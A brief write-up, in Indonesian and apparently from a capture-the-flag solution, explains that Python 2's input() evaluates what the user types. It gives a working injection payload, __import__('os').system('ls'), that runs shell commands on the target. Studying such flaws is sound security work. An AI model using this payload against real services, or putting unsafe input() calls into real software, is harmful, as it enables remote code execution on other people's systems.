## Python2 Input vulnerabilty

```python
data = input() # line 32
```
    Pada input python2 terdapat bug yang membuat input tidak difilter pada tipe datanya.

    Dengan begitu kita dapat memasukkan input yang dapat memanggil os untuk mendapatkan RCE

```python
__import__('os').system('ls')
```